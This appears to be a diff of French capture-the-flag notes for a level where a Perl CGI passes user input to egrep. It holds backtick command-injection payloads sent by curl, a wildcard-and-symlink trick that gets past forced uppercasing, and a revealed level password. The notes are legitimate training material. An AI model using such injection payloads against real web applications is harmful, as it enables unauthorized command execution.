@@ -30,7 +30,6 @@ LEVEL 12
 
     Le foreach est useless, le but à priori c'est de parvenir à match la regex avec un fichier contenant getflag
 
-
     Pour matcher le egrep, il faut donc un string en uppercase
 
     Le cgi ne print pas l'output donc à aucun moment on peut avoir le flag dans la réponse http
@@ -40,7 +39,12 @@ LEVEL 12
     On va chercher à injecter un script executant getflag
     On peut rediriger car, sauf erreur, log insuffisant dans les log d'apache
 
-    Osef de ce que fait  @output = `egrep "^$xx" /tmp/x 2>&1`; car tant qu'on peut y injecter notre code, on l'isole au milieu et ça suffit
+    Ce que fait cette ligne est secondaire @output = `egrep "^$xx" /tmp/x 2>&1`; car tant qu'on peut y injecter notre code, on l'isole au milieu et ça suffit
+
+    On peut tenter ce genre de contournement
+    ln -s /bin/getflag /tmp/newBin
+    $ /*/newBin
+
 
     Donc on aura un fichier (en majuscule) : FILE pour matcher le 
 
@@ -50,13 +54,20 @@ LEVEL 12
     Le wildcart est requis pour éviter d'y mettre un string qui va être uppercase par le cgi et donc path vers le FILE non trouvable
     Le /*/ va chercher partout, notamment dans /tmp
 
-
     cat /tmp/x => Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 
     su level13 g1qKMiRpXf53AWhDaU7FEkczr
 
+    Au cas où ça ne fonctionne pas (pourtant début janvier ça passait --'), on peut se baser sur les log d'apache
+    
+    ln -s /bin/getflag /tmp/FLAG
+    /*/FLAG -> check
+    curl 127.0.0.1:4646/level12.pl?x=`/*/FLAG>&2` (Btw, getflag print en stderr)
+    curl 127.0.0.1:4646/level12.pl?x=`%2F%2A%2FFLAG%3E%262`
+    Ou : 192.168.1.4:4646/level12.pl?x=`%2F%2A%2FFLAG%3E%262`
+    tail /var/log/apache2/error.log
 
-* Infos
+* Infosr
 
 ------------------------------------------------------------------------------------------------------------------------
 
